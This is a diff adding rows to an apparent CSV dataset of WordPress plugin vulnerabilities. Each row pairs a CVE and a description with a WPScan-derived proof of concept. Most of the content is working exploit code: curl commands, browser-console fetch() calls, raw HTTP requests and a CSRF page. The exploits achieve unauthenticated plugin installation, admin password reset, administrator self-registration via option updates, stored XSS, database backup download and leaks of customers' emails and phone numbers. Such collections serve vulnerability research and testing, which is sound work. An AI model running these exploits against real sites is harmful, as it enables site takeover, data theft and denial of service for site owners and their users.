@@ -491,3 +491,265 @@ fetch(""/wp-admin/admin-ajax.php"", {
   },""method"":""POST"",
 ""body"": ""action=save_new_alert&wp_stream_alerts_nonce=XXXX&wp_stream_trigger_author=&wp_stream_trigger_context=users-sessions&wp_stream_trigger_action=login&wp_stream_alert_type=email&wp_stream_alert_status=wp_stream_enabled&wp_stream_email_recipient=recipient%40example.com&wp_stream_email_subject=test"",
 });",https://wpscan.com/vulnerability/2b506252-6f37-439e-8984-7316d5cca2e5/
+41,cleantalk-spam-protect,< 6.45,Unauthenticated Arbitrary Plugin Installation,The plugin is vulnerable to unauthorized Arbitrary Plugin Installation due to a missing empty value check on the 'api_key' value in the 'perform' function. This makes it possible for unauthenticated attackers to install and activate arbitrary plugins which can be leveraged to achieve remote code execution if another vulnerable plugin is installed and activated.,CVE-2024-10781,"curl --url 'http://vulnerable-site.tld/?spbc_remote_call_token=d41d8cd98f00b204e9800998ecf8427e&spbc_remote_call_action=install_plugin&plugin_name=antispam&plugin=jetpack/jetpack.php'
+
+curl --url 'http://vulnerable-site.tld/?spbc_remote_call_token=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855&spbc_remote_call_action=install_plugin&plugin_name=antispam&plugin=jetpack/jetpack.php'",https://wpscan.com/vulnerability/9e4870eb-cbcb-4a2a-bf4f-d4610f2afeca/
+42,mycred,< 2.4.4,Subscriber+ Arbitrary Post Creation,"The plugin does not have any authorisation and CSRF checks in the mycred-tools-import-export AJAX action, allowing any authenticated users, such as subscribers, to call it and import mycred setup, thus creating badges, managing points or creating arbitrary posts.",CVE-2022-0363,"PoC for creating arbitrary posts:
+
+let formData = new FormData;
+formData.append('_file', new Blob(['{""badges"":{""7"":{""badge"":""O:7:\\""WP_Post\\"":3:{s:12:\\""post_content\\"";s:4:\\""test\\"";s:10:\\""post_title\\"";s:4:\\""test\\"";s:9:\\""post_type\\"";s:4:\\""post\\"";}""}}}']))
+formData.append('action', 'mycred-tools-import-export');
+formData.append('request_tab', 'setup');
+formData.append('request', 'import');
+fetch(""/wp-admin/admin-ajax.php"", {
+  ""body"": formData,
+  ""method"": ""POST""
+});",https://wpscan.com/vulnerability/a438a951-497c-43cd-822f-1a48d4315191/
+43,tawkto-live-chat,< 0.6.0,Subscriber+ Visitor Monitoring & Chat Removal,"The plugin does not have capability and CSRF checks in the tawkto_setwidget and tawkto_removewidget AJAX actions, available to any authenticated user. The first one allows low-privileged users (including simple subscribers) to change the 'tawkto-embed-widget-page-id' and 'tawkto-embed-widget-widget-id' parameters. Any authenticated user can thus link the vulnerable website to their own Tawk.to instance. Consequently, they will be able to monitor the vulnerable website and interact with its visitors (receive contact messages, answer, ...). They will also be able to display an arbitrary Knowledge Base. The second one will remove the live chat widget from pages.",CVE-2021-24914,"POST /wp-admin/admin-ajax.php?action=tawkto_setwidget
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+Content-Length: 50
+Content-Type: application/x-www-form-urlencoded
+Cookie: [any authenticated user]
+
+pageId=61786f4e86aee40a573880d7&widgetId=1fiv75jah
+
+
+https://example.com/wp-admin/admin-ajax.php?action=tawkto_removewidget",https://wpscan.com/vulnerability/39392055-8cd3-452f-8bcb-a650f5bddc2e/
+44,simply-gallery-block,< 3.0.8,Subscriber+ Arbitrary Options Update,"The plugin has an AJAX endpoint that can be accessed by any authenticated users, such as subscriber. The callback function allows numerous actions, the most serious one being reading and updating the WordPress options which could be used to enable registration with a default administrator user role.",CVE-2023-0441,"Run the below command in the developer console of the web browser while being on the on the welcome page of the plugin (/wp-admin/admin.php?page=pgc-simply-welcome) as a subscriber, this will enable registration with a default administrator role.
+
+fetch( '/wp-admin/admin-ajax.php', {method:'POST', headers:{'Content-Type': 'application/x-www-form-urlencoded'}, body: 'action=pgc_sgb_action_wizard&nonce=' + PGC_SGB_WELCOME_PAGE.nonce + '&props=' + JSON.stringify({options:{users_can_register: 1,default_role: 'administrator'},type: 'update_option'}) } );",https://wpscan.com/vulnerability/11703e49-c042-4eb6-9a5f-6e006e3725a0/
+45,woocommerce-order-status-change-notifier,<= 1.1.0,Subscriber+ Arbitrary Order Status Update,"The plugin does not have authorisation and CSRF when updating status orders via an AJAX action available to any authenticated users, which could allow low privilege users such as subscriber to update arbitrary order status, making them paid without actually paying for them for example",CVE-2023-2179,"Run the below command in the developer console of the web browser while being logged in as a subscriber, this will change the status of the order #337 to processing
+
+fetch(""/wp-admin/admin-ajax.php"", {
+  ""headers"": {
+    ""content-type"": ""application/x-www-form-urlencoded"",
+  },
+  ""method"": ""POST"",
+  ""body"": 'action=wc_osc_update_order_status_comment&method=change_status&order_id=337&status=processing',
+  ""credentials"": ""include""
+}).then(response => response.text())
+  .then(data => console.log(data));",https://wpscan.com/vulnerability/fbc56973-4225-4f44-8c38-d488e57cd551/
+46,meeting-scheduler-by-vcita,< 4.3.0,Subscriber+ Denial of Service by account logout,"The plugin does not validate authorization in the vcita_logout ajax action, allowing any logged in user (with roles as low as subscriber) to log the site out from the cvita account, causing a denial of service for the appointment scheduling functionality.",CVE-2023-2415,"fetch(“/wp-admin/admin-ajax.php?action=vcita_logout”, {
+     method: “POST”,
+     headers: {
+       Accept: “*/*”,
+       “Content-Type”: “application/json”,
+     },
+   });",https://wpscan.com/vulnerability/d96477b3-e055-4775-8347-d3b963650f50/
+47,Bricks Builder,< 1.5.4,Subscriber+ Arbitrary Post/Page Edition,"The theme does not have authorisation in an AJAX action, which could allow any authenticated users such as subscriber to call it and edit any page, post, or template on the blog",CVE-2022-3400,"1. Start with a clean Wordpress install
+2. Install Bricks builder v1.5.3
+3. Enable registrations on the website
+4. Register as a new user, log in, and copy the cookies
+5. Find a valid postId (e.g. 2 - the ID of Sample Page created by default in new Wordpress installations)
+6. Send the following request to the server
+
+curl 'http://example.com/wp-admin/admin-ajax.php' -X POST \
+-H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
+-H 'Cookie: INSERT_COOKIES_HERE' \
+--data-raw 'action=bricks_save_post&postId=INSERT_POST_ID_HERE&area=content&nonce=0&content=%5B%7B%22id%22%3A%22aijdog%22%2C%22name%22%3A%22text%2Dbasic%22%2C%22parent%22%3A0%2C%22children%22%3A%5B%5D%2C%22settings%22%3A%7B%22text%22%3A%22Pwned%22%7D%7D%5D'
+
+7. The contents of the page should be replaced with a paragraph reading ""Pwned""",https://wpscan.com/vulnerability/ab4735ad-b2ec-45a3-9872-3bbaee7e143d/
+48,armember-membership,< 3.4.8,Unauthenticated Admin Account Takeover,"The plugin is vulnerable to account takeover (even the administrator) due to missing nonce and authorization checks in an AJAX action available to unauthenticated users, allowing them to change the password of arbitrary users by knowing their username",CVE-2022-1903,"curl 'https://example.com/wp-admin/admin-ajax.php' \
+    --data 'action=arm_shortcode_form_ajax_action&user_pass=newpassword&repeat_pass=newpassword&arm_action=change-password&key2=x&action2=rp&login2=admin'
+
+Notes:
++ The `login2` parameter corresponds to the username to change the password for (in our case it's the ""admin"" user)
++ The `user_pass` and `repeat_pass` correspond to the new password to be set (both fields must be set to the same password)",https://wpscan.com/vulnerability/28d26aa6-a8db-4c20-9ec7-39821c606a08/
+49,addify-product-stock-manager,< 1.0.5,Subscriber+ Unauthorised AJAX Calls,"The plugin does not have authorisation and proper CSRF checks in multiple AJAX actions, allowing users with a role as low as subscriber to call them. One action in particular could allow to update arbitrary options",CVE-2022-3451,"To set the default role for new users to administrator, run the below command in the developer console of the web browser while being logged on the blog as a subscriber user
+
+fetch(""/wp-admin/admin-ajax.php"", {
+  ""headers"": {
+    ""content-type"": ""application/x-www-form-urlencoded"",
+  },
+  ""method"": ""POST"",
+  ""body"": 'action=af_sm_set_checkbox_status&name=default_role&checkbox_status=administrator',
+  ""credentials"": ""include""
+}).then(response => response.text())
+  .then(data => console.log(data));",https://wpscan.com/vulnerability/d8005cd0-8232-4d43-a4e4-14728eaf1300/
+50,duplicate-page-or-post,< 1.5.1,Arbitrary Settings Update to Stored XSS,"The plugin does not have any authorisation and has a flawed CSRF check in the wpdevart_duplicate_post_parametrs_save_in_db AJAX action, allowing any authenticated users, such as subscriber to call it and change the plugin's settings, or perform such attack via CSRF. Furthermore, due to the lack of escaping, this could lead to Stored Cross-Site Scripting issues",CVE-2021-25075,"fetch(""https://example.com/wp-admin/admin-ajax.php"", {
+  ""headers"": {
+    ""content-type"": ""application/x-www-form-urlencoded""
+  },
+  ""body"": new URLSearchParams({""action"": ""wpdevart_duplicate_post_parametrs_save_in_db"", ""title_prefix"": '"" style=animation-name:rotation onanimationstart=alert(/XSS/) p'}),
+  ""method"": ""POST"",
+  ""credentials"": ""include""
+}).then(response => response.text())
+  .then(data => console.log(data));
+
+POST /wp-admin/admin-ajax.php HTTP/1.1
+Accept: */*
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-type: application/x-www-form-urlencoded
+Content-Length: 140
+Connection: close
+Cookie: [any authenticated user]
+
+action=wpdevart_duplicate_post_parametrs_save_in_db&title_prefix=%22+style%3Danimation-name%3Arotation+onanimationstart%3Dalert%28/XSS/%29+p
+
+
+The XSS will be triggered when an admin access the plugin's settings page: https://example.com/wp-admin/admin.php?page=wpda_duplicate_post_menu",https://wpscan.com/vulnerability/db5a0431-af4d-45b7-be4e-36b6c90a601b/
+51,activecampaign-for-woocommerce,< 1.9.8,Subscriber+ Error Log Cleanup,"The plugin does not have authorisation check when cleaning up its error logs via an AJAX action, which could allow any authenticated users, such as subscriber to call it and remove error logs.",CVE-2022-3923,"Run the below command in the developer console of the web browser while being on the blog as a subscriber user:
+
+fetch('/wp-admin/admin-ajax.php', {
+        method: 'POST',
+        headers: new Headers({
+            'Content-Type': 'application/x-www-form-urlencoded',
+        }),
+        body: 'action=activecampaign_for_woocommerce_clear_error_log',
+        redirect: 'follow'
+    }).then(response => response.text()).then(result => console.log(result)).catch(error => console.log('error', error));",https://wpscan.com/vulnerability/6536946a-7ebf-4f8f-9446-36ec2a2a3ad2/
+52,link-library,< 7.2.8,Unauthenticated Arbitrary Links Deletion,"The plugin does not have authorisation in place when deleting links, allowing unauthenticated users to delete arbitrary links via a crafted request",CVE-2021-25093,https://example.com/?post_type=link_library_links&ll60reupdate=1,https://wpscan.com/vulnerability/7a7603ce-d76d-4c49-a886-67653bed8cd3/
+53,browser-and-operating-system-finder,<= 1.2,Unauthenticated Arbitrary Settings Update to Stored XSS,"The plugin does not have authorisation and CSRF checks when saving its settings, allowing unauthenticated users to update them, which could also lead to Stored XSS due to the lack of sanitisation and escaping.",CVE-2021-20851,"POST / HTTP/1.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 116
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+bf_browser_hidden=Y&bf_browser_name=%22%3E%3Cimg+src+onerror%3Dalert%28%2FXSS%2F%29%3E&bf_os_name=a&bf_clean_class=0",https://wpscan.com/vulnerability/5509962a-90bb-4072-9ce6-eabb70436346/
+54,church-admin,< 3.4.135,Unauthenticated Plugin's Backup Disclosure,"The plugin does not have authorisation and CSRF in some of its action as well as requested files, allowing unauthenticated attackers to repeatedly request the ""refresh-backup"" action, and simultaneously keep requesting a publicly accessible temporary file generated by the plugin in order to disclose the final backup filename, which can then be fetched by the attacker to download the backup of the plugin's DB data",CVE-2022-0833,"1. In one terminal, continuously fetch from http://127.0.0.1:8080/?action=refresh-backup:
+
+while true; do curl -s 'http://127.0.0.1:8080/?action=refresh-backup' >/dev/null; done
+
+2. In a second terminal, continuously fetch from /wp-content/uploads/church-admin-cache/temp.sql
+
+while true; do curl -s http://127.0.0.1:8080/wp-content/uploads/church-admin-cache/temp.sql | grep '\.sql\.gz'; done
+
+3. After a while, the backup filename should be found by the curl | grep
+   command (second terminal), once found, abort the command in terminal one first,
+   then the one in the second terminal - use the last output of the second terminal as the filename (<md5-hash>.sql.gz).
+
+4. Download the backup by accessing it via http://127.0.0.1:8080/wp-content/uploads/church-admin-cache/<extracted-md5-hash>.sql.gz",https://wpscan.com/vulnerability/b2c7c1e8-d72c-4b1e-b5cb-dc2a6538965d/
+55,wp-migration-duplicator,< 1.4.4,Subscriber+ Plugin Settings Update,"The plugin does not authorize some AJAX requests, allowing users with a role as low as Subscriber to update some plugin settings.",CVE-2023-5737,"fetch(""/wp-admin/admin-ajax.php"", {
+  ""headers"": {
+    ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"",
+  },
+  ""body"": ""settings_data%5Bim_data_size_per_req%5D=100&settings_data%5Bim_db_file_per_req%5D=200&action=mgdp_plugin_save_import_settings"",
+  ""method"": ""POST"",
+  ""mode"": ""cors"",
+  ""credentials"": ""include""
+});
+
+Open http://127.0.0.1:8001/wp-admin/admin.php?page=wp-migration-duplicator#wt-mgdp-import and click on Advanced Options to see the updated settings.",https://wpscan.com/vulnerability/c761c67c-eab8-4e1b-a332-c9a45e22bb13/
+56,miniorange-discord-integration,< 2.1.6,Subscriber+ App Disabling,"The plugin does not have authorisation and CSRF in some of its AJAX actions, allowing any logged in users, such as subscriber to call them, and disable the app for example",CVE-2022-3082,"Run the below command in the developer console of the web browser while being on the blog as any user, such as subscriber
+
+fetch(""/wp-admin/admin-ajax.php"", {
+  ""headers"": {
+    ""content-type"": ""application/x-www-form-urlencoded"",
+  },
+  ""method"": ""POST"",
+  ""body"": 'action=mo_discord_disable_app&app_name=test',
+  ""credentials"": ""include""
+}).then(response => response.text())
+  .then(data => console.log(data));",https://wpscan.com/vulnerability/a91d0501-c2a9-4c6c-b5da-b3fc29442a4f/
+57,order-delivery-date,< 12.3.1,Unauthenticated Arbitrary Option Update,"The plugin does not have authorization and CSRF checks when importing settings. Furthermore it also lacks proper checks to only update options relevant to the plugin. This leads to attackers being able to modify the default_user_role to administrator and users_can_register, allowing them to register as an administrator of the site for complete site takeover.",CVE-2025-2907,"Save the below in a JSOn file:
+a:2:{s:18:""users_can_register"";b:1;s:12:""default_role"";s:13:""administrator"";}
+
+Then run one of the following cURL commands:
+
+curl --location 'http://example.com/wp-admin/admin-ajax.php' \
+--header 'Content-Type: multipart/form-data' \
+--form 'action=""orddd_import""' \
+--form 'is_drag_drop_request_ajax=""yes""' \
+--form 'orddd-import-file=@""path-to-saved-file.json""'
+
+curl --location 'https://example.com/wp-admin/admin-post.php' \
+--header 'Content-Type: multipart/form-data' \
+--form 'orddd-import-file=@""path-to-saved-file.json""'",https://wpscan.com/vulnerability/2e513930-ec01-4dc6-8991-645c5267e14c/
+58,thirstyaffiliates,< 3.10.5,Subscriber+ Arbitrary Affiliate Links Creation,"The plugin does not have authorisation and CSRF checks when creating affiliate links, which could allow any authenticated user, such as subscriber to create arbitrary affiliate links, which could then be used to redirect users to an arbitrary website",CVE-2022-0398,"fetch(""/wp-admin/admin-ajax.php"", {
+  ""headers"": {
+    ""content-type"": ""application/x-www-form-urlencoded"",
+  },
+  ""body"": ""action=ta_process_quick_add_affiliate_link&ta_link_name=test&ta_destination_url=https://wpscan.com/&ta_redirect_type=301"",
+  ""method"": ""POST"",
+  ""credentials"": ""include""
+}).then(response => response.text())
+  .then(data => console.log(data));",https://wpscan.com/vulnerability/21aec131-91ff-4300-ac7a-0bf31d6b2b24/
+59,w4-post-list,< 2.4.6,Subscriber+ Password Protected Post Content Disclosure,"The plugin does not ensure that password protected posts can be accessed before displaying their content, which could allow any authenticated users to access them",CVE-2023-1371,"Setup: Create a default Post list, and create a password protected post with secret content
+
+Then, run the below command in the developer console of the web browser while being on the blog as a subscriber user
+
+fetch(""/wp-admin/admin-ajax.php"", {
+  ""headers"": {
+    ""content-type"": ""application/x-www-form-urlencoded"",
+  },
+  ""method"": ""POST"",
+  ""body"": ""action=parse-media-shortcode&shortcode=[postlist listId='1']"",
+  ""credentials"": ""include""
+}).then(response => response.text())
+  .then(data => console.log(data));
+
+This will display the content of the password protected post",https://wpscan.com/vulnerability/ad5c167e-77f7-453c-9443-df6e07705d89/
+60,woocommerce-product-addon,< 24.0,Subscriber+ Settings Update to Stored XSS,"The plugin does not have authorisation and CSRF checks in the ppom_settings_panel_action AJAX action, allowing any authenticated to call it and set arbitrary settings. Furthermore, due to the lack of sanitisation and escaping, it could lead to Stored XSS issues",CVE-2021-25018,"1. Use the new settings panel framework by clicking the ""migrate"" button on https://example.com/wp-admin/admin.php?page=wc-settings&tab=ppom_settings
+2. Attach PPOM fields to any Woocommerce product (product must have a price set for XSS to trigger)
+3. Run (as any logged-in user, e.g. a subscriber):
+
+fetch(""https://example.com/wp-admin/admin-ajax.php"", {
+  ""headers"": {
+    ""content-type"": ""application/x-www-form-urlencoded"",
+  },
+  ""body"": ""action=ppom_settings_panel_action&ppom-settings_panel[ppom_label_product_price]=<img src onerror=alert(`XSS`) x"",
+  ""method"": ""POST"",
+  ""credentials"": ""include""
+}).then(response => response.text())
+  .then(data => console.log(data));
+
+4. The XSS will be triggered on the products where PPOM fields are enabled",https://wpscan.com/vulnerability/9e092aad-0b36-45a9-8987-8d904b34fbb2/
+61,tenweb-speed-optimizer,< 2.24.18,Unauthenticated Arbitrary Option Deletion,"The plugin does not validate the option name given to some AJAX actions, allowing unauthenticated users to delete arbitrary options from the database, leading to denial of service.",CVE-2023-5559,"fetch(""http://127.0.0.1:8001/wp-admin/admin-ajax.php"", {
+  ""headers"": {
+    ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"",
+  },
+  ""body"": 'action=two_activate_score_check&nonce=template',
+  ""method"": ""POST"",
+});
+
+Changing the `nonce` parameter to, for example, `nonce=siteurl` will cause the site to no longer work.",https://wpscan.com/vulnerability/eba46f7d-e4db-400c-8032-015f21087bbf/
+62,smart-forms,< 2.6.87,Subscriber+ Arbitrary Entry Deletion,"The plugin does not have authorisation in various AJAX actions, which could allow users with a role as low as subscriber to call them and perform unauthorised actions such as deleting entries. The plugin also lacks CSRF checks in some places which could allow attackers to make logged in users perform unwanted actions via CSRF attacks such as deleting entries.",CVE-2023-7203,"<!DOCTYPE html>
+<html>
+  <body>
+    <script>
+      const formData = new FormData();
+      formData.append('action', 'rednao_smart_form_delete_entries');
+      formData.append('data', '{""Ids"":[""1"",""2""]}');
+
+      const csrfForm = document.createElement('form');
+      csrfForm.method = 'POST';
+      csrfForm.action = 'https://example.com/wp-admin/admin-ajax.php';
+      csrfForm.enctype = 'multipart/form-data';
+
+      const boundary = '----WebKitFormBoundaryAFcqGF5eShv7ARup';
+      csrfForm.setAttribute('boundary', boundary);
+
+      for (const pair of formData) {
+        const input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = pair[0];
+        input.value = pair[1];
+        csrfForm.appendChild(input);
+      }
+
+      document.body.appendChild(csrfForm);
+      csrfForm.submit();
+    </script>
+  </body>
+</html>",https://wpscan.com/vulnerability/b514b631-c3e3-4793-ab5d-35ed0c38b011/
+63,woo-product-slider,< 2.5.7,Subscriber+ Arbitrary Options Deletion,"The plugin has flawed CSRF checks and lack authorisation in some of its AJAX actions, allowing any authenticated users, such as subscriber to call them. One in particular could allow them to delete arbitrary blog options.",CVE-2022-2382,"fetch(""/wp-admin/admin-ajax.php"", {
+  ""headers"": {
+    ""content-type"": ""application/x-www-form-urlencoded"",
+  },
+
+  ""method"": ""POST"",
+  ""body"": ""action=spwps-reset&unique=template"",
+  ""credentials"": ""include""
+}).then(response => response.text())
+  .then(data => console.log(data));",https://wpscan.com/vulnerability/777d4637-444b-4eda-bc21-95d3a3bf6cd3/
+64,eventon-lite,< 2.1.2,Unauthenticated Event Access,"The plugin lacks authentication and authorization in its eventon_ics_download ajax action, allowing unauthenticated visitors to access private and password protected Events by guessing their numeric id.",CVE-2023-2796,https://example.com/wp-admin/admin-ajax.php?action=eventon_ics_download&event_id=value,https://wpscan.com/vulnerability/e9ef793c-e5a3-4c55-beee-56b0909f7a0d/
+65,woocommerce-chained-products,< 2.12.0,Unauthenticated Arbitrary Options Update to 'no',"The plugin does not have authorisation and CSRF checks, as well as does not ensure that the option to be updated belong to the plugin, allowing unauthenticated attackers to set arbitrary options to 'no'",CVE-2022-4872,"As unauthenticated, open the following URL to set the Blog Name to 'no': https://example.com/wp-admin/admin-post.php?cp_dismiss_admin_notice=1&option_name=blogname",https://wpscan.com/vulnerability/c76a1c0b-8a5b-4639-85b6-9eebc63c3aa6/
+66,salon-booking-system,< 7.6.3,Unauthenticated Sensitive Data Disclosure,"The plugin does not have proper authorisation when searching bookings, allowing any unauthenticated users to search other's booking, as well as retrieve sensitive information about the bookings, such as the full name, email and phone number of the person who booked it.",CVE-2022-0919,"Although the API only returns the name of customer, the search feature can be abused to leak email and phone, for example, search ""a@"", ""b@"", ""c@""... to determine email address char by char.
+
+curl -X POST https://example.com/wp-admin/admin-ajax.php -d 'action=salon&day=2022-03-11&search=%40&method=SearchBookings'",https://wpscan.com/vulnerability/e8f32e0b-4a89-460b-bb78-7c83ef5e16b4/
